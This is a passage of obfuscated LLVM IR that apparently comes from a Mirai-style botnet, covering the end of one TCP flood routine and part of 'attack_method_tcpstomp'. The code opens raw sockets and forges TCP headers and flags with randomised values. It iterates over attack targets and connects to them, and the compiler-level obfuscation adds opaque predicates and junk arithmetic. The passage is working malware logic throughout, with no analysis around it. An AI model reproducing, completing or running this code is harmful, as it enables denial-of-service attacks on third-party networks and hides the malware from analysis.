  %651 = sext i32 %650 to i64
  %652 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %649, i64 %651
  %653 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %652, i32 0, i32 1
  %654 = load i32, i32* %653, align 4
  %655 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %656 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %655, i32 0, i32 9
  store i32 %654, i32* %656, align 4
  %657 = load i16, i16* %16, align 2
  %658 = call zeroext i16 @htons(i16 zeroext %657) #7
  %659 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %660 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %659, i32 0, i32 0
  store i16 %658, i16* %660, align 4
  %661 = load i16, i16* %17, align 2
  %662 = call zeroext i16 @htons(i16 zeroext %661) #7
  %663 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %664 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %663, i32 0, i32 1
  store i16 %662, i16* %664, align 2
  %665 = load i32, i32* %18, align 4
  %666 = trunc i32 %665 to i16
  %667 = call zeroext i16 @htons(i16 zeroext %666) #7
  %668 = zext i16 %667 to i32
  %669 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %670 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %669, i32 0, i32 2
  store i32 %668, i32* %670, align 4
  %671 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %672 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %671, i32 0, i32 4
  %673 = load i16, i16* %672, align 4
  %_ = sub i16 %673, -241
  %gen = mul i16 %_, -241
  %_11 = shl i16 %673, -241
  %674 = and i16 %673, -241
  %_12 = shl i16 %674, 80
  %_13 = sub i16 %674, 80
  %gen14 = mul i16 %_13, 80
  %_15 = shl i16 %674, 80
  %_16 = sub i16 %674, 80
  %gen17 = mul i16 %_16, 80
  %_18 = sub i16 0, %674
  %gen19 = add i16 %_18, 80
  %_20 = shl i16 %674, 80
  %675 = or i16 %674, 80
  store i16 %675, i16* %672, align 4
  %676 = load i8, i8* %20, align 1
  %677 = sext i8 %676 to i16
  %678 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %679 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %678, i32 0, i32 4
  %680 = load i16, i16* %679, align 4
  %_21 = shl i16 %677, 1
  %_22 = sub i16 %677, 1
  %gen23 = mul i16 %_22, 1
  %_24 = sub i16 %677, 1
  %gen25 = mul i16 %_24, 1
  %_26 = sub i16 %677, 1
  %gen27 = mul i16 %_26, 1
  %_28 = sub i16 %677, 1
  %gen29 = mul i16 %_28, 1
  %_30 = shl i16 %677, 1
  %_31 = sub i16 %677, 1
  %gen32 = mul i16 %_31, 1
  %681 = and i16 %677, 1
  %_33 = sub i16 0, %681
  %gen34 = add i16 %_33, 13
  %_35 = sub i16 %681, 13
  %gen36 = mul i16 %_35, 13
  %_37 = sub i16 %681, 13
  %gen38 = mul i16 %_37, 13
  %682 = shl i16 %681, 13
  %_39 = sub i16 0, %680
  %gen40 = add i16 %_39, -8193
  %_41 = shl i16 %680, -8193
  %_42 = shl i16 %680, -8193
  %_43 = sub i16 0, %680
  %gen44 = add i16 %_43, -8193
  %_45 = shl i16 %680, -8193
  %_46 = shl i16 %680, -8193
  %_47 = sub i16 0, %680
  %gen48 = add i16 %_47, -8193
  %683 = and i16 %680, -8193
  %_49 = sub i16 0, %683
  %gen50 = add i16 %_49, %682
  %_51 = sub i16 %683, %682
  %gen52 = mul i16 %_51, %682
  %684 = or i16 %683, %682
  store i16 %684, i16* %679, align 4
  %685 = load i8, i8* %21, align 1
  %686 = sext i8 %685 to i16
  %687 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %688 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %687, i32 0, i32 4
  %689 = load i16, i16* %688, align 4
  %_53 = shl i16 %686, 1
  %_54 = sub i16 %686, 1
  %gen55 = mul i16 %_54, 1
  %_56 = sub i16 0, %686
  %gen57 = add i16 %_56, 1
  %_58 = shl i16 %686, 1
  %_59 = sub i16 0, %686
  %gen60 = add i16 %_59, 1
  %_61 = sub i16 %686, 1
  %gen62 = mul i16 %_61, 1
  %690 = and i16 %686, 1
  %_63 = sub i16 %690, 12
  %gen64 = mul i16 %_63, 12
  %_65 = sub i16 0, %690
  %gen66 = add i16 %_65, 12
  %_67 = shl i16 %690, 12
  %_68 = sub i16 %690, 12
  %gen69 = mul i16 %_68, 12
  %691 = shl i16 %690, 12
  %_70 = sub i16 %689, -4097
  %gen71 = mul i16 %_70, -4097
  %_72 = sub i16 %689, -4097
  %gen73 = mul i16 %_72, -4097
  %_74 = shl i16 %689, -4097
  %692 = and i16 %689, -4097
  %_75 = shl i16 %692, %691
  %_76 = sub i16 0, %692
  %gen77 = add i16 %_76, %691
  %_78 = sub i16 0, %692
  %gen79 = add i16 %_78, %691
  %_80 = sub i16 0, %692
  %gen81 = add i16 %_80, %691
  %_82 = sub i16 0, %692
  %gen83 = add i16 %_82, %691
  %693 = or i16 %692, %691
  store i16 %693, i16* %688, align 4
  %694 = load i8, i8* %22, align 1
  %695 = sext i8 %694 to i16
  %696 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %697 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %696, i32 0, i32 4
  %698 = load i16, i16* %697, align 4
  %_84 = shl i16 %695, 1
  %_85 = sub i16 0, %695
  %gen86 = add i16 %_85, 1
  %_87 = sub i16 0, %695
  %gen88 = add i16 %_87, 1
  %_89 = sub i16 %695, 1
  %gen90 = mul i16 %_89, 1
  %699 = and i16 %695, 1
  %_91 = sub i16 %699, 11
  %gen92 = mul i16 %_91, 11
  %_93 = shl i16 %699, 11
  %_94 = shl i16 %699, 11
  %_95 = sub i16 0, %699
  %gen96 = add i16 %_95, 11
  %_97 = shl i16 %699, 11
  %_98 = sub i16 0, %699
  %gen99 = add i16 %_98, 11
  %700 = shl i16 %699, 11
  %_100 = sub i16 %698, -2049
  %gen101 = mul i16 %_100, -2049
  %_102 = sub i16 0, %698
  %gen103 = add i16 %_102, -2049
  %701 = and i16 %698, -2049
  %_104 = sub i16 %701, %700
  %gen105 = mul i16 %_104, %700
  %_106 = shl i16 %701, %700
  %_107 = sub i16 0, %701
  %gen108 = add i16 %_107, %700
  %_109 = sub i16 0, %701
  %gen110 = add i16 %_109, %700
  %_111 = sub i16 %701, %700
  %gen112 = mul i16 %_111, %700
  %_113 = sub i16 0, %701
  %gen114 = add i16 %_113, %700
  %_115 = sub i16 0, %701
  %gen116 = add i16 %_115, %700
  %702 = or i16 %701, %700
  store i16 %702, i16* %697, align 4
  %703 = load i8, i8* %23, align 1
  %704 = sext i8 %703 to i16
  %705 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %706 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %705, i32 0, i32 4
  %707 = load i16, i16* %706, align 4
  %_117 = shl i16 %704, 1
  %_118 = sub i16 %704, 1
  %gen119 = mul i16 %_118, 1
  %_120 = sub i16 %704, 1
  %gen121 = mul i16 %_120, 1
  %_122 = sub i16 0, %704
  %gen123 = add i16 %_122, 1
  %_124 = sub i16 0, %704
  %gen125 = add i16 %_124, 1
  %708 = and i16 %704, 1
  %_126 = shl i16 %708, 10
  %_127 = sub i16 %708, 10
  %gen128 = mul i16 %_127, 10
  %_129 = sub i16 %708, 10
  %gen130 = mul i16 %_129, 10
  %709 = shl i16 %708, 10
  %_131 = sub i16 0, %707
  %gen132 = add i16 %_131, -1025
  %_133 = sub i16 0, %707
  %gen134 = add i16 %_133, -1025
  %710 = and i16 %707, -1025
  %_135 = sub i16 0, %710
  %gen136 = add i16 %_135, %709
  %_137 = sub i16 %710, %709
  %gen138 = mul i16 %_137, %709
  %_139 = sub i16 %710, %709
  %gen140 = mul i16 %_139, %709
  %_141 = shl i16 %710, %709
  %711 = or i16 %710, %709
  store i16 %711, i16* %706, align 4
  %712 = load i8, i8* %24, align 1
  %713 = sext i8 %712 to i16
  %714 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %715 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %714, i32 0, i32 4
  %716 = load i16, i16* %715, align 4
  %717 = and i16 %713, 1
  %_142 = sub i16 0, %717
  %gen143 = add i16 %_142, 9
  %_144 = shl i16 %717, 9
  %_145 = sub i16 %717, 9
  %gen146 = mul i16 %_145, 9
  %_147 = sub i16 0, %717
  %gen148 = add i16 %_147, 9
  %_149 = sub i16 %717, 9
  %gen150 = mul i16 %_149, 9
  %_151 = shl i16 %717, 9
  %_152 = shl i16 %717, 9
  %718 = shl i16 %717, 9
  %_153 = sub i16 %716, -513
  %gen154 = mul i16 %_153, -513
  %_155 = shl i16 %716, -513
  %_156 = shl i16 %716, -513
  %_157 = sub i16 %716, -513
  %gen158 = mul i16 %_157, -513
  %_159 = shl i16 %716, -513
  %_160 = sub i16 0, %716
  %gen161 = add i16 %_160, -513
  %_162 = sub i16 0, %716
  %gen163 = add i16 %_162, -513
  %719 = and i16 %716, -513
  %_164 = sub i16 0, %719
  %gen165 = add i16 %_164, %718
  %_166 = shl i16 %719, %718
  %_167 = sub i16 0, %719
  %gen168 = add i16 %_167, %718
  %_169 = shl i16 %719, %718
  %_170 = shl i16 %719, %718
  %_171 = sub i16 %719, %718
  %gen172 = mul i16 %_171, %718
  %_173 = sub i16 %719, %718
  %gen174 = mul i16 %_173, %718
  %720 = or i16 %719, %718
  store i16 %720, i16* %715, align 4
  %721 = load i8, i8* %25, align 1
  %722 = sext i8 %721 to i16
  %723 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %724 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %723, i32 0, i32 4
  %725 = load i16, i16* %724, align 4
  %_175 = sub i16 %722, 1
  %gen176 = mul i16 %_175, 1
  %_177 = sub i16 0, %722
  %gen178 = add i16 %_177, 1
  %_179 = shl i16 %722, 1
  %_180 = shl i16 %722, 1
  %726 = and i16 %722, 1
  %_181 = sub i16 %726, 8
  %gen182 = mul i16 %_181, 8
  %_183 = sub i16 %726, 8
  %gen184 = mul i16 %_183, 8
  %_185 = shl i16 %726, 8
  %727 = shl i16 %726, 8
  %_186 = shl i16 %725, -257
  %728 = and i16 %725, -257
  %729 = or i16 %728, %727
  store i16 %729, i16* %724, align 4
  %730 = call i32 @rand_next()
  %_187 = shl i32 %730, 65535
  %_188 = sub i32 0, %730
  %gen189 = add i32 %_188, 65535
  %731 = and i32 %730, 65535
  %732 = trunc i32 %731 to i16
  %733 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %734 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %733, i32 0, i32 5
  store i16 %732, i16* %734, align 2
  %735 = load i8, i8* %22, align 1
  %736 = icmp ne i8 %735, 0
  br label %originalBB10

originalBB193alteredBB:                           ; preds = %originalBB193, %341
  %737 = load i32, i32* %9, align 4
  %_194 = sub i32 0, %737
  %gen195 = add i32 %_194, 1
  %_196 = sub i32 %737, 1
  %gen197 = mul i32 %_196, 1
  %_198 = shl i32 %737, 1
  %_199 = sub i32 %737, 1
  %gen200 = mul i32 %_199, 1
  %738 = add nsw i32 %737, 1
  store i32 %738, i32* %9, align 4
  br label %originalBB193

originalBB204alteredBB:                           ; preds = %originalBB204, %362
  %739 = load i32, i32* %9, align 4
  %740 = load i8, i8* %5, align 1
  %741 = zext i8 %740 to i32
  %742 = icmp slt i32 %739, %741
  br label %originalBB204

originalBB208alteredBB:                           ; preds = %originalBB208, %383
  %743 = load i8**, i8*** %11, align 8
  %744 = load i32, i32* %9, align 4
  %745 = sext i32 %744 to i64
  %746 = getelementptr inbounds i8*, i8** %743, i64 %745
  %747 = load i8*, i8** %746, align 8
  store i8* %747, i8** %32, align 8
  %748 = load i8*, i8** %32, align 8
  %749 = bitcast i8* %748 to %struct.iphdr*
  store %struct.iphdr* %749, %struct.iphdr** %33, align 8
  %750 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %751 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %750, i64 1
  %752 = bitcast %struct.iphdr* %751 to %struct.tcphdr*
  store %struct.tcphdr* %752, %struct.tcphdr** %34, align 8
  %753 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %754 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %753, i64 1
  %755 = bitcast %struct.tcphdr* %754 to i8*
  store i8* %755, i8** %35, align 8
  %756 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %757 = load i32, i32* %9, align 4
  %758 = sext i32 %757 to i64
  %759 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %756, i64 %758
  %760 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %759, i32 0, i32 2
  %761 = load i8, i8* %760, align 4
  %762 = zext i8 %761 to i32
  %763 = icmp slt i32 %762, 32
  br label %originalBB208

originalBB212alteredBB:                           ; preds = %originalBB212, %449
  %764 = load i16, i16* %13, align 2
  %765 = zext i16 %764 to i32
  %766 = icmp eq i32 %765, 65535
  br label %originalBB212

originalBB216alteredBB:                           ; preds = %originalBB216, %485
  %767 = load i16, i16* %17, align 2
  %768 = zext i16 %767 to i32
  %769 = icmp eq i32 %768, 65535
  br label %originalBB216

originalBB220alteredBB:                           ; preds = %originalBB220, %514
  %770 = call i32 @rand_next()
  %771 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %772 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %771, i32 0, i32 2
  store i32 %770, i32* %772, align 4
  br label %originalBB220

originalBB224alteredBB:                           ; preds = %originalBB224, %534
  %773 = load i32, i32* %19, align 4
  %774 = icmp eq i32 %773, 65535
  br label %originalBB224

originalBB228alteredBB:                           ; preds = %originalBB228, %557
  %775 = load i8, i8* %27, align 1
  %776 = icmp ne i8 %775, 0
  br label %originalBB228
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 0)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %122

; <label>:105:                                    ; preds = %4
  %106 = load i32, i32* @x.29
  %107 = load i32, i32* @y.30
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %105
  %114 = load i32, i32* @x.29
  %115 = load i32, i32* @y.30
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %783

; <label>:122:                                    ; preds = %4
  %123 = load i32, i32* @x.29
  %124 = load i32, i32* @y.30
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %122
  store i32 1, i32* %9, align 4
  %131 = load i32, i32* %10, align 4
  %132 = bitcast i32* %9 to i8*
  %133 = call i32 @setsockopt(i32 %131, i32 0, i32 3, i8* %132, i32 4) #6
  %134 = icmp eq i32 %133, -1
  %135 = load i32, i32* @x.29
  %136 = load i32, i32* @y.30
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %134, label %143, label %146

; <label>:143:                                    ; preds = %originalBBpart24
  %144 = load i32, i32* %10, align 4
  %145 = call i32 @close(i32 %144)
  br label %783

; <label>:146:                                    ; preds = %originalBBpart24
  store i32 0, i32* %9, align 4
  br label %147

; <label>:147:                                    ; preds = %636, %146
  %148 = load i32, i32* @x.29
  %149 = load i32, i32* @y.30
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %147
  %156 = load i32, i32* %9, align 4
  %157 = load i8, i8* %5, align 1
  %158 = zext i8 %157 to i32
  %159 = icmp slt i32 %156, %158
  %160 = load i32, i32* @x.29
  %161 = load i32, i32* @y.30
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %159, label %168, label %639

; <label>:168:                                    ; preds = %originalBBpart28
  br label %169

; <label>:169:                                    ; preds = %631, %originalBBpart2101, %168
  %170 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %170, i32* %26, align 4
  %171 = icmp eq i32 %170, -1
  br i1 %171, label %172, label %189

; <label>:172:                                    ; preds = %169
  %173 = load i32, i32* @x.29
  %174 = load i32, i32* @y.30
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %172
  %181 = load i32, i32* @x.29
  %182 = load i32, i32* @y.30
  %183 = sub i32 %181, 1
  %184 = mul i32 %181, %183
  %185 = urem i32 %184, 2
  %186 = icmp eq i32 %185, 0
  %187 = icmp slt i32 %182, 10
  %188 = or i1 %186, %187
  br i1 %188, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %636

; <label>:189:                                    ; preds = %169
  %190 = load i32, i32* %26, align 4
  %191 = load i32, i32* %26, align 4
  %192 = call i32 (i32, i32, ...) @fcntl(i32 %191, i32 3, i32 0)
  %193 = or i32 %192, 2048
  %194 = call i32 (i32, i32, ...) @fcntl(i32 %190, i32 4, i32 %193)
  %195 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %195, align 4
  %196 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %199, i32 0, i32 2
  %201 = load i8, i8* %200, align 4
  %202 = zext i8 %201 to i32
  %203 = icmp slt i32 %202, 32
  br i1 %203, label %204, label %225

; <label>:204:                                    ; preds = %189
  %205 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %206 = load i32, i32* %9, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %205, i64 %207
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %208, i32 0, i32 1
  %210 = load i32, i32* %209, align 4
  %211 = call i32 @ntohl(i32 %210) #7
  %212 = call i32 @rand_next()
  %213 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %214 = load i32, i32* %9, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %213, i64 %215
  %217 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %216, i32 0, i32 2
  %218 = load i8, i8* %217, align 4
  %219 = zext i8 %218 to i32
  %220 = lshr i32 %212, %219
  %221 = add i32 %211, %220
  %222 = call i32 @htonl(i32 %221) #7
  %223 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %224 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %223, i32 0, i32 0
  store i32 %222, i32* %224, align 4
  br label %234

; <label>:225:                                    ; preds = %189
  %226 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %227 = load i32, i32* %9, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %226, i64 %228
  %230 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %229, i32 0, i32 1
  %231 = load i32, i32* %230, align 4
  %232 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %233 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %232, i32 0, i32 0
  store i32 %231, i32* %233, align 4
  br label %234

; <label>:234:                                    ; preds = %225, %204
  %235 = load i16, i16* %17, align 2
  %236 = zext i16 %235 to i32
  %237 = icmp eq i32 %236, 65535
  br i1 %237, label %238, label %259

; <label>:238:                                    ; preds = %234
  %239 = load i32, i32* @x.29
  %240 = load i32, i32* @y.30
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %238
  %247 = call i32 @rand_next()
  %248 = and i32 %247, 65535
  %249 = trunc i32 %248 to i16
  %250 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %249, i16* %250, align 2
  %251 = load i32, i32* @x.29
  %252 = load i32, i32* @y.30
  %253 = sub i32 %251, 1
  %254 = mul i32 %251, %253
  %255 = urem i32 %254, 2
  %256 = icmp eq i32 %255, 0
  %257 = icmp slt i32 %252, 10
  %258 = or i1 %256, %257
  br i1 %258, label %originalBBpart222, label %originalBB14alteredBB

originalBBpart222:                                ; preds = %originalBB14
  br label %263

; <label>:259:                                    ; preds = %234
  %260 = load i16, i16* %17, align 2
  %261 = call zeroext i16 @htons(i16 zeroext %260) #7
  %262 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %261, i16* %262, align 2
  br label %263

; <label>:263:                                    ; preds = %259, %originalBBpart222
  %264 = load i32, i32* %26, align 4
  %265 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %266 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %266, %struct.sockaddr** %265, align 8
  %267 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %268 = load %struct.sockaddr*, %struct.sockaddr** %267, align 8
  %269 = call i32 @connect(i32 %264, %struct.sockaddr* %268, i32 16)
  %270 = call i64 @time(i64* null) #6
  store i64 %270, i64* %31, align 8
  br label %271

; <label>:271:                                    ; preds = %634, %263
  store i32 16, i32* %29, align 4
  %272 = load i32, i32* %10, align 4
  %273 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %274 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %275 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %275, %struct.sockaddr** %274, align 8
  %276 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %277 = load %struct.sockaddr*, %struct.sockaddr** %276, align 8
